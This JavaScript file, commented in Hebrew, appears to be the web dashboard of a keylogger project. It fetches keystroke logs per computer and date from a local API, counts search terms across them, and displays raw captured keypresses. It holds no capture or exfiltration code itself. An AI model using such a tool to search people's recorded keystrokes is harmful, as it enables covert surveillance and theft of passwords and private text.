// קבועים גלובליים
const API_BASE_URL = 'http://127.0.0.1:5000/api';
const ELEMENTS = {
    computer: document.getElementById("computer"),
    searchInput: document.getElementById("inp"),
    result: document.getElementById("result"),
    resultData: document.getElementById("result-data"),
    date: document.getElementById("date"),
    follower: document.getElementById("Follo"),
    startButton: document.getElementById("start"),
    startButtonText: document.getElementById("text-start-button"),
    circle: document.querySelector(".sircle-card"),
    animation: document.getElementById("animation"),
    modalButton: document.querySelector('.show-button'),
    modalBlock: document.querySelector('.block'),
    modalOverlay: document.querySelector('.overlay'),
    modalCloseButton: document.querySelector('.close-button')
};

// פונקציות עזר
function countStringInJSON(jsonData, searchStr) {
    if (!jsonData || !jsonData.keypresses || !Array.isArray(jsonData.keypresses) || !searchStr) return "Not found";
    
    let count = 0;
    const lowerSearch = searchStr.toLowerCase();

    jsonData.keypresses.forEach(item => {
        if (item.key) {
            const keyValue = item.key.toString().toLowerCase();
            count += keyValue.split(lowerSearch).length - 1;
        }
    });

    return count;
}

function updateComputerName() {
    if (ELEMENTS.computer && ELEMENTS.follower) {
        ELEMENTS.follower.textContent = ELEMENTS.computer.value;
    }
}

// פונקציות API
async function fetchAndCountForComputer(computer, searchStr) {
    let totalCount = 0;
    try {
        // קריאה לשרת לקבלת רשימת התאריכים
        const listResponse = await fetch(`${API_BASE_URL}/computers/${computer}`);
        if (!listResponse.ok) {
            throw new Error(`שגיאה בטעינת רשימת התאריכים עבור ${computer}`);
        }
        const dates = await listResponse.json();
        
        if (!Array.isArray(dates)) {
            throw new Error("המבנה של רשימת התאריכים לא תואם את הציפיות");
        }
        
        // מעבר על כל תאריך וביצוע הספירה
        for (const date of dates) {
            try {
                const dayResponse = await fetch(`${API_BASE_URL}/computers/${computer}/${date}`);
                if (!dayResponse.ok) {
                    console.error(`שגיאה בטעינת הנתונים עבור היום ${date}: ${dayResponse.status}`);
                    continue;
                }
                const dayData = await dayResponse.json();
                totalCount += countStringInJSON(dayData, searchStr);
            } catch (dayError) {
                console.error(`שגיאה בעיבוד הנתונים עבור היום ${date}:`, dayError);
            }
        }
    } catch (error) {
        console.error("שגיאה בטעינת רשימת התאריכים:", error);
        throw error;
    }
    
    return totalCount;
}

async function fetchDayData(computer, day) {
    const response = await fetch(`${API_BASE_URL}/computers/${computer}/${day}`);
    if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
    }
    return response.json();
}

// פונקציות UI
async function handleSearch() {
    if (!ELEMENTS.computer || !ELEMENTS.searchInput || !ELEMENTS.result) {
        console.error("אחד מהאלמנטים לא נמצא");
        return;
    }

    const computer = ELEMENTS.computer.value;
    const searchStr = ELEMENTS.searchInput.value;

    try {
        const totalCount = await fetchAndCountForComputer(computer, searchStr);
        ELEMENTS.result.innerHTML = totalCount;
    } catch (error) {
        ELEMENTS.result.innerHTML = "שגיאה בטעינת הנתונים";
    }
}

function handleStartButtonClick() {
    const { startButtonText, circle, animation } = ELEMENTS;
    const isStarting = startButtonText.innerHTML === "start";
    
    // עדכון טקסט וצבע הכפתור
    startButtonText.innerHTML = isStarting ? "stop" : "start";
    startButtonText.style.color = isStarting ? "#ff3914" : "#39ff14";
    
    // עדכון נראות האנימציה
    animation.style.visibility = isStarting ? "visible" : "hidden";
    
    // עדכון סגנון העיגול
    const circleStyles = isStarting ? {
        border: "1px solid #ff1414",
        boxShadow: "0 0 10px #ff1414",
        hoverShadow: "0 0 20px #ff1414, 0 0 40px #ff3914"
    } : {
        border: "1px solid var(--neon-blue)",
        boxShadow: "0 0 10px var(--neon-blue)",
        hoverShadow: "0 0 20px var(--neon-blue), 0 0 40px var(--neon-green)"
    };
    
    // עדכון סגנונות
    circle.style.border = circleStyles.border;
    circle.style.boxShadow = circleStyles.boxShadow;
    document.documentElement.style.setProperty('--shine-color', 
        isStarting ? 'rgba(255, 20, 20, 0.2)' : 'rgba(0, 243, 255, 0.2)');
    
    // עדכון אירועי hover
    circle.addEventListener('mouseenter', () => circle.style.boxShadow = circleStyles.hoverShadow);
    circle.addEventListener('mouseleave', () => circle.style.boxShadow = circleStyles.boxShadow);
}

async function handleFormSubmit(event) {
    event.preventDefault();
    const computer = ELEMENTS.computer.value;
    const day = ELEMENTS.date.value;
    
    updateComputerName();
    
    try {
        const data = await fetchDayData(computer, day);
        ELEMENTS.resultData.innerHTML = "<pre>" + JSON.stringify(data, null, 4) + "</pre>";
    } catch (error) {
        console.error('Error:', error);
    }
}

// טיפול במודל
function showModal() {
    document.body.classList.add('modal-open');
    ELEMENTS.modalBlock.classList.add('show');
    ELEMENTS.modalOverlay.classList.add('show');
    ELEMENTS.modalButton.style.display = 'none';
}

function hideModal() {
    document.body.classList.remove('modal-open');
    ELEMENTS.modalBlock.classList.remove('show');
    ELEMENTS.modalOverlay.classList.remove('show');
    ELEMENTS.modalButton.style.display = 'block';
}

// הגדרת event listeners
function initializeEventListeners() {
    ELEMENTS.startButton?.addEventListener('click', handleStartButtonClick);
    ELEMENTS.modalButton?.addEventListener('click', showModal);
    ELEMENTS.modalCloseButton?.addEventListener('click', hideModal);
    ELEMENTS.modalOverlay?.addEventListener('click', hideModal);
}

// אתחול
function initialize() {
    updateComputerName();
    initializeEventListeners();
}

// הפעלת האתחול כשהדף נטען
document.addEventListener('DOMContentLoaded', initialize);
